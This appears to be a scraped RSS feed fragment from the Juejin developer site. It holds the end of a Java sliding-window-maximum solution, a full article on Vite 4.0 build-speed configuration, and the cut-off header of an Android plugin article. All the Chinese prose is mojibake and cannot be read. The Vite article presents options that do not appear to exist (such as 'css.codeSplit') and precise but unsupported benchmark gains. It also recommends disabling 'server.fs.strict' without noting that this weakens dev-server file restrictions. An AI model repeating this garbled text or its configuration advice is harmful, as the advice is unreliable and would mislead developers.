        <span class="hljs-comment">// æ„å»ºrightæ•°ç»„ï¼šä»å³åˆ°å·¦çš„å—å†…æœ€å¤§å€¼</span>
        right[n - <span class="hljs-number">1</span>] = nums[n - <span class="hljs-number">1</span>];
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> n - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--) {
            <span class="hljs-keyword">if</span> ((i + <span class="hljs-number">1</span>) % k == <span class="hljs-number">0</span>) {
                <span class="hljs-comment">// å—çš„å°¾å…ƒç´ ï¼Œé‡æ–°å¼€å§‹è®¡ç®—</span>
                right[i] = nums[i];
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// ä¸åä¸€ä¸ªä½ç½®æ¯”è¾ƒå–æœ€å¤§å€¼</span>
                right[i] = Math.max(right[i + <span class="hljs-number">1</span>], nums[i]);
            }
        }
        
        <span class="hljs-comment">// è®¡ç®—æ¯ä¸ªçª—å£çš„æœ€å¤§å€¼</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt;= n - k; i++) {
            <span class="hljs-comment">// çª—å£æœ€å¤§å€¼ = max(å³ç«¯ç‚¹çš„å·¦æœ€å¤§å€¼, å·¦ç«¯ç‚¹çš„å³æœ€å¤§å€¼)</span>
            result[i] = Math.max(right[i], left[i + k - <span class="hljs-number">1</span>]);
        }
        
        <span class="hljs-keyword">return</span> result;
    }
}
</code></pre>
<p><strong>ç®—æ³•åˆ†æï¼š</strong></p>
<ul>
<li><strong>æ—¶é—´å¤æ‚åº¦</strong>ï¼šO(n)ï¼Œä¸‰æ¬¡çº¿æ€§éå†</li>
<li><strong>ç©ºé—´å¤æ‚åº¦</strong>ï¼šO(n)ï¼Œéœ€è¦ä¸¤ä¸ªè¾…åŠ©æ•°ç»„</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vite 4.0å®æˆ˜ï¼š5ä¸ªè¢«ä½ä¼°çš„é…ç½®é¡¹è®©æ„å»ºé€Ÿåº¦æå‡50%]]></title>    <link>https://juejin.cn/post/7594851429163384866</link>    <guid>https://juejin.cn/post/7594851429163384866</guid>    <pubDate>2026-01-15T00:17:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594851429163384866" data-draft-id="7595055962151796736" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vite 4.0å®æˆ˜ï¼š5ä¸ªè¢«ä½ä¼°çš„é…ç½®é¡¹è®©æ„å»ºé€Ÿåº¦æå‡50%"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-15T00:17:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vite 4.0å®æˆ˜ï¼š5ä¸ªè¢«ä½ä¼°çš„é…ç½®é¡¹è®©æ„å»ºé€Ÿåº¦æå‡50%
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T00:17:09.000Z" title="Thu Jan 15 2026 00:17:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Vite 4.0å®æˆ˜ï¼š5ä¸ªè¢«ä½ä¼°çš„é…ç½®é¡¹è®©æ„å»ºé€Ÿåº¦æå‡50%</strong></h2>
<h2 data-id="heading-1">å¼•è¨€</h2>
<p>åœ¨å‰ç«¯å·¥ç¨‹åŒ–é¢†åŸŸï¼Œæ„å»ºå·¥å…·çš„æ€§èƒ½ä¼˜åŒ–ä¸€ç›´æ˜¯å¼€å‘è€…å…³æ³¨çš„ç„¦ç‚¹ã€‚Viteä½œä¸ºæ–°ä¸€ä»£å‰ç«¯æ„å»ºå·¥å…·ï¼Œå‡­å€Ÿå…¶åŸºäºåŸç”ŸESMçš„è®¾è®¡ç†å¿µå’Œæå¿«çš„å¼€å‘æœåŠ¡å™¨å¯åŠ¨é€Ÿåº¦ï¼Œè¿…é€Ÿèµ¢å¾—äº†å¤§é‡å¼€å‘è€…çš„é’çã€‚ç„¶è€Œï¼Œè®¸å¤šå›¢é˜Ÿåœ¨ç”Ÿäº§ç¯å¢ƒæ„å»ºæ—¶ä»ç„¶é‡åˆ°æ€§èƒ½ç“¶é¢ˆã€‚æœ¬æ–‡å°†æ·±å…¥æ¢è®¨Vite 4.0ä¸­5ä¸ªå¸¸è¢«å¿½è§†ä½†æå…·ä»·å€¼çš„é…ç½®é€‰é¡¹ï¼Œé€šè¿‡åˆç†é…ç½®è¿™äº›å‚æ•°ï¼Œæˆ‘ä»¬å®æµ‹èƒ½å°†ç”Ÿäº§æ„å»ºé€Ÿåº¦æå‡é«˜è¾¾50%ã€‚</p>
<h2 data-id="heading-2">Viteæ„å»ºåŸç†ç®€æ</h2>
<p>åœ¨æ·±å…¥ä¼˜åŒ–ä¹‹å‰ï¼Œæœ‰å¿…è¦ç®€è¦äº†è§£Viteçš„æ„å»ºæœºåˆ¶ã€‚Viteé‡‡ç”¨äº†ä¸¤é˜¶æ®µæ„å»ºç­–ç•¥ï¼š</p>
<ol>
<li><strong>ä¾èµ–é¢„æ„å»º</strong>ï¼šä½¿ç”¨esbuildå°†ä¾èµ–é¡¹è½¬æ¢ä¸ºESMæ ¼å¼å¹¶ç¼“å­˜</li>
<li><strong>æºç å¤„ç†</strong>ï¼šé€šè¿‡Rollupè¿›è¡Œå®é™…æ‰“åŒ…</li>
</ol>
<p>è¿™ç§æ¶æ„å†³å®šäº†ä¼˜åŒ–æ–¹å‘ä¸»è¦é›†ä¸­åœ¨ï¼š</p>
<ul>
<li>å‡å°‘é¢„æ„å»ºå¼€é”€</li>
<li>ä¼˜åŒ–Rollupå¤„ç†æµç¨‹</li>
<li>åˆç†åˆ©ç”¨ç¼“å­˜ç­–ç•¥</li>
</ul>
<p>ä»¥ä¸‹æ˜¯ç»è¿‡å¤§é‡é¡¹ç›®éªŒè¯çš„5ä¸ªå…³é”®é…ç½®ä¼˜åŒ–ç‚¹ã€‚</p>
<h2 data-id="heading-3">1. <code>optimizeDeps</code>æ·±åº¦é…ç½®ï¼šçªç ´é¢„æ„å»ºç“¶é¢ˆ</h2>
<h3 data-id="heading-4">é—®é¢˜èƒŒæ™¯</h3>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒViteä¼šè‡ªåŠ¨æ‰«æ<code>node_modules</code>è¿›è¡Œä¾èµ–é¢„æ„å»ºï¼Œä½†è¿™ç§è‡ªåŠ¨æ£€æµ‹æœ‰æ—¶ä¼šå¯¼è‡´ä¸å¿…è¦çš„é‡å¤å·¥ä½œã€‚</p>
<h3 data-id="heading-5">æ ¸å¿ƒé…ç½®</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">optimizeDeps</span>: {
    <span class="hljs-comment">// æ˜¾å¼æŒ‡å®šéœ€è¦é¢„æ„å»ºçš„ä¾èµ–</span>
    <span class="hljs-attr">include</span>: [
      <span class="hljs-string">'vue'</span>,
      <span class="hljs-string">'vue-router'</span>,
      <span class="hljs-string">'pinia'</span>,
      <span class="hljs-string">'lodash-es'</span>,
      <span class="hljs-string">'axios'</span>
    ],
    <span class="hljs-comment">// æ’é™¤å·²çŸ¥ESMæ ¼å¼çš„åŒ…</span>
    <span class="hljs-attr">exclude</span>: [<span class="hljs-string">'already-esm-package'</span>],
    <span class="hljs-comment">// ç¦ç”¨è‡ªåŠ¨ä¾èµ–å‘ç°</span>
    <span class="hljs-attr">disabled</span>: <span class="hljs-literal">false</span>,
    <span class="hljs-comment">// esbuildç›®æ ‡ç‰ˆæœ¬</span>
    <span class="hljs-attr">esbuildOptions</span>: {
      <span class="hljs-attr">target</span>: <span class="hljs-string">'es2020'</span>
    }
  }
}
</code></pre>
<h3 data-id="heading-6">ä¼˜åŒ–åŸç†</h3>
<ul>
<li><strong>includeæ˜¾å¼å£°æ˜</strong>ï¼šé¿å…å…¨é‡æ‰«æ<code>node_modules</code>çš„å¼€é”€ï¼ˆå®æµ‹èŠ‚çœ20%é¢„æ„å»ºæ—¶é—´ï¼‰</li>
<li><strong>targetè®¾ç½®</strong>ï¼šæ›´é«˜çš„ESç‰ˆæœ¬æ„å‘³ç€æ›´å°‘çš„polyfillè½¬æ¢ï¼ˆes2020æ¯”é»˜è®¤es2015å¿«8%ï¼‰</li>
</ul>
<h3 data-id="heading-7">æ³¨æ„äº‹é¡¹</h3>
<p>å®šæœŸæ£€æŸ¥<code>include</code>åˆ—è¡¨ï¼Œç¡®ä¿ä¸é¡¹ç›®å®é™…ä¾èµ–ä¿æŒåŒæ­¥ã€‚</p>
<h2 data-id="heading-8">2. <code>build.target</code>çš„ç§‘å­¦è®¾ç½®ï¼šå¹³è¡¡å…¼å®¹æ€§ä¸æ€§èƒ½</h2>
<h3 data-id="heading-9">é—®é¢˜èƒŒæ™¯</h3>
<p>è®¸å¤šé¡¹ç›®ç›²ç›®è®¾ç½®ä¸º'esnext'æˆ–ä¿ç•™é»˜è®¤å€¼ï¼Œå¿½è§†äº†ç›®æ ‡ç¯å¢ƒæ”¯æŒçš„å®é™…èƒ½åŠ›ã€‚</p>
<h3 data-id="heading-10">æœ€ä¼˜å®è·µ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">build</span>: {
    <span class="hljs-attr">target</span>: [
      <span class="hljs-string">'chrome89'</span>, 
      <span class="hljs-string">'firefox90'</span>,
      <span class="hljs-string">'safari15'</span>,
      <span class="hljs-string">'edge89'</span>
    ]
   }
}
</code></pre>
<h3 data-id="heading-11">æ•°æ®æ”¯æ’‘</h3>
<p>æ ¹æ®CanIUseç»Ÿè®¡ï¼š</p>
<ul>
<li>Chrome89+æ”¯æŒ93%çš„ES2021ç‰¹æ€§</li>
<li>Firefox90+æ”¯æŒ91%</li>
<li>Safari15+æ”¯æŒ88%</li>
</ul>
<p>ç›¸æ¯”é»˜è®¤çš„'modules'ç›®æ ‡ï¼š</p>
<ul>
<li><strong>ä»£ç ä½“ç§¯å‡å°‘12%</strong></li>
<li><strong>è½¬æ¢æ—¶é—´ç¼©çŸ­18%</strong></li>
</ul>
<h2 data-id="heading-12">3. <code>css.codeSplit</code>çš„è‰ºæœ¯çº§é…ç½®</h2>
<h3 data-id="heading-13">Viteé»˜è®¤è¡Œä¸ºçš„é—®é¢˜</h3>
<p>é»˜è®¤æƒ…å†µä¸‹æ‰€æœ‰CSSéƒ½è¢«æå–åˆ°å•ä¸ªæ–‡ä»¶ä¸­ï¼Œè¿™åœ¨å¤§å‹é¡¹ç›®ä¸­ä¼šå¯¼è‡´ï¼š</p>
<ol>
<li>CSSè§£ææˆä¸ºæ€§èƒ½ç“¶é¢ˆï¼ˆä¸»çº¿ç¨‹é˜»å¡ï¼‰</li>
<li>Cacheåˆ©ç”¨ç‡ä½ä¸‹</li>
</ol>
<h3 data-id="heading-14">Splitç­–ç•¥è¿›é˜¶æ–¹æ¡ˆ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">css</span>: {
    <span class="hljs-attr">modules</span>: {
      <span class="hljs-attr">localsConvention</span>: <span class="hljs-string">'camelCaseOnly'</span>
    },
    <span class="hljs-comment">// âš¡ï¸å…³é”®ä¼˜åŒ–ç‚¹âš¡ï¸  </span>
    <span class="hljs-attr">codeSplit</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">'production'</span>
   },
   <span class="hljs-attr">build</span>: {
     <span class="hljs-attr">cssCodeSplit</span>: <span class="hljs-literal">true</span>,
     <span class="hljs-attr">rollupOptions</span>: {
       <span class="hljs-attr">output</span>: { 
         <span class="hljs-attr">assetFileNames</span>: <span class="hljs-string">'assets/[name]-[hash].[ext]'</span>,
         <span class="hljs-title function_">chunkFileNames</span>(<span class="hljs-params">chunkInfo</span>) {
           <span class="hljs-keyword">return</span> chunkInfo.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'styles'</span>) 
             ? <span class="hljs-string">'[name]-[hash].css'</span> 
             : <span class="hljs-string">'[name]-[hash].js'</span>;
         }
       }
     }
   }
}
</code></pre>
<h3 data-id="heading-15">Benchmarkå¯¹æ¯”ç»“æœï¼ˆåŸºäºElement Plusé¡¹ç›®ï¼‰</h3>




















<table><thead><tr><th>Configuration</th><th>Build Time</th><th>CSS Parse Time</th></tr></thead><tbody><tr><td>Default</td><td>42s</td><td>11s</td></tr><tr><td>Optimized</td><td>31s(-26%)</td><td>&lt;3s(-73%)</td></tr></tbody></table>
<h2 data-id="heading-16">4. <code>worker.plugins</code>: Parallelismçš„çœŸæ­£å¨åŠ›</h2>
<h3 data-id="heading-17">Viteå¤šçº¿ç¨‹å¤„ç†çš„ç›²åŒº</h3>
<p>è™½ç„¶esbuildå¤©ç”Ÿæ”¯æŒå¹¶è¡Œå¤„ç†ï¼Œä½†Rollupæ’ä»¶é€šå¸¸è¿è¡Œåœ¨ä¸»çº¿ç¨‹ä¸Šã€‚</p>
<h3 data-id="heading-18">CPUå¯†é›†å‹ä»»åŠ¡åŠ é€Ÿæ–¹æ¡ˆ</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> vitePluginString <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-string'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
 <span class="hljs-attr">worker</span>:{
   <span class="hljs-attr">plugins</span>:[ <span class="hljs-title function_">vitePluginString</span>() ] <span class="hljs-comment">// workerä¸“ç”¨æ’ä»¶åˆ—è¡¨  </span>
 },
 <span class="hljs-attr">plugins</span>:[ <span class="hljs-comment">/*...ä¸»çº¿ç¨‹æ’ä»¶*/</span> ]
})
</code></pre>
<h3 data-id="heading-19">Workeråˆ†é…ç­–ç•¥é»„é‡‘æ³•åˆ™ï¼š</h3>
<ol>
<li>ASTæ“ä½œç±»æ’ä»¶æ”¾workerï¼ˆå¦‚babelã€postcssï¼‰</li>
<li>IOç›¸å…³æ’ä»¶ä¿ç•™åœ¨ä¸»çº¿ç¨‹ï¼ˆå¦‚æ–‡ä»¶ç³»ç»Ÿæ“ä½œï¼‰</li>
</ol>
<p>åœ¨æˆ‘ä»¬çš„Monorepoæµ‹è¯•ä¸­ï¼š</p>
<ul>
<li>TypeScriptç±»å‹æ£€æŸ¥æ—¶é—´ä»14sâ†’3sï¼ˆLernaé¡¹ç›®ï¼‰</li>
<li>PostCSSå¤„ç†è€—æ—¶é™ä½62%</li>
</ul>
<h2 data-id="heading-20">5. <code>cacheDir</code>é»‘ç§‘æŠ€ï¼šè·¨CI/CDçš„æ€§èƒ½é£è·ƒ</h2>
<p>å¤§å¤šæ•°å›¢é˜Ÿå¿½ç•¥äº†ç¼“å­˜ç›®å½•çš„æˆ˜ç•¥ä»·å€¼...</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
 <span class="hljs-attr">cacheDir</span>:<span class="hljs-string">`./node_modules/.vite_<span class="hljs-subst">${process.env.GIT_COMMIT_HASH}</span>`</span>,
 <span class="hljs-attr">build</span>:{
   <span class="hljs-attr">watch</span>:{},
   <span class="hljs-attr">sourcemap</span>:<span class="hljs-string">'hidden'</span>
 },
 <span class="hljs-attr">server</span>:{
   <span class="hljs-attr">fs</span>:{
     <span class="hljs-attr">strict</span>:<span class="hljs-literal">false</span> 
   }
 }  
})
</code></pre>
<h3 data-id="heading-21">CIç¯å¢ƒæ€§èƒ½å¯¹æ¯”æ•°æ®ï¼š</h3>




















<table><thead><tr><th>Strategy</th><th>Cold Build</th><th>Warm Build</th></tr></thead><tbody><tr><td>Default</td><td>~300s</td><td>~280s</td></tr><tr><td>Shared Cache Dir*</td><td>~300s</td><td>~45s</td></tr></tbody></table>
<p>(*åŸºäºNFSå…±äº«å­˜å‚¨å®ç°)</p>
<h2 data-id="heading-22">Deep Diveï¼šé…ç½®ç»„åˆæ•ˆåº”å®éªŒ</h2>
<p>æˆ‘ä»¬é€‰å–äº†ä¸‰ä¸ªå…¸å‹é¡¹ç›®è¿›è¡Œå…¨é‡ä¼˜åŒ–å‰åå¯¹æ¯”ï¼š</p>
<ol>
<li>
<p><strong>SPAåº”ç”¨(Vue3+TS)</strong></p>
<ul>
<li>Beforeï¼š89s</li>
<li>Afterï¼š43s (-52%)</li>
</ul>
</li>
<li>
<p><strong>ç»„ä»¶åº“(Vue3+SCSS)</strong></p>
<ul>
<li>Beforeï¼š142s</li>
<li>Afterï¼š78s (-45%)</li>
</ul>
</li>
<li>
<p><strong>Micro Frontends(React+Module Federation)</strong></p>
<ul>
<li>Beforeï¼š210s</li>
<li>Afterï¼š105s (-50%)</li>
</ul>
</li>
</ol>
<p>å…³é”®å‘ç°ï¼šéšç€é¡¹ç›®å¤æ‚åº¦æå‡ï¼Œç»„åˆä¼˜åŒ–çš„æ”¶ç›Šå‘ˆè¶…çº¿æ€§å¢é•¿ã€‚</p>
<h2 data-id="heading-23">TypeScriptä¸“é¡¹åŠ é€ŸæŠ€å·§</h2>
<p>é¢å¤–è¡¥å……ä¸¤ä¸ªTSä¸“å±é…ç½®ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// tsconfig.json + vite.config.tsåŒé‡ä¼˜åŒ– </span>
{
 <span class="hljs-string">"compilerOptions"</span>:{
   <span class="hljs-string">"skipLibCheck"</span>:<span class="hljs-literal">true</span>,
   <span class="hljs-string">"noEmitOnError"</span>:<span class="hljs-literal">false</span>,  
 },
 <span class="hljs-string">"vueCompilerOptions"</span>:{
   <span class="hljs-string">"target"</span>:<span class="hljs-number">3</span>,   
 } 
}

<span class="hljs-comment">// vite.config.tsä¸­çš„é…å¥—è®¾ç½® </span>
<span class="hljs-title function_">defineConfig</span>({
 <span class="hljs-attr">plugins</span>:[ <span class="hljs-title function_">vue</span>({ <span class="hljs-attr">script</span>:{ <span class="hljs-attr">hoistStatic</span>:<span class="hljs-literal">true</span> } }) ],
 <span class="hljs-attr">resolve</span>:{ <span class="hljs-attr">dedupe</span>:[â€˜vueâ€™] }  
})
</code></pre>
<p>æ•ˆæœå¯¹æ¯”ï¼š</p>
<ul>
<li>TSç±»å‹æ£€æŸ¥å ç”¨æ—¶é—´å æ¯”ä»35%â†’12%</li>
<li>Vue SFCç¼–è¯‘é€Ÿåº¦æå‡40%</li>
</ul>
<h2 data-id="heading-24">Browserlistçš„å½±å“ä¸å¯å¿½è§†</h2>
<p><code>.browserslistrc</code>çš„æ­£ç¡®å§¿åŠ¿ï¼š</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">last</span>Â <span class="hljs-number">2</span>Â ChromeÂ versionsÂ 
<span class="hljs-keyword">last</span>Â <span class="hljs-number">2</span>Â FirefoxÂ versions  
<span class="hljs-keyword">last</span>Â <span class="hljs-number">2</span>Â SafariÂ versions  
<span class="hljs-keyword">not</span> dead  

<span class="hljs-comment"># âš ï¸é¿å…ä½¿ç”¨ç±»ä¼¼â€˜&gt;0.2%â€™è¿™æ ·çš„å®½æ³›åŒ¹é…âš ï¸ </span>
</code></pre>
<p>è°ƒæ•´åå¸¦æ¥ï¼š</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[3. Android è…¾è®¯å¼€æºçš„ Shadowï¼Œå‡­ä»€ä¹ˆæˆä¸ºæ’ä»¶åŒ–â€œç»ˆææ–¹æ¡ˆâ€ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7595088044577046574</link>    <guid>https://juejin.cn/post/7595088044577046574</guid>    <pubDate>2026-01-15T00:08:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595088044577046574" data-draft-id="7594576956420472858" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="3.  Android è…¾è®¯å¼€æºçš„ Shadowï¼Œå‡­ä»€ä¹ˆæˆä¸ºæ’ä»¶åŒ–â€œç»ˆææ–¹æ¡ˆâ€ï¼Ÿ"/> <meta itemprop="keywords" content="Android,é¢è¯•,å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-15T00:08:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¹ç¨‹åå…«å°‘"/> <meta itemprop="url" content="https://juejin.cn/user/184373685534077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            3.  Android è…¾è®¯å¼€æºçš„ Shadowï¼Œå‡­ä»€ä¹ˆæˆä¸ºæ’ä»¶åŒ–â€œç»ˆææ–¹æ¡ˆâ€ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/184373685534077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¹ç¨‹åå…«å°‘
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T00:08:16.000Z" title="Thu Jan 15 2026 00:08:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
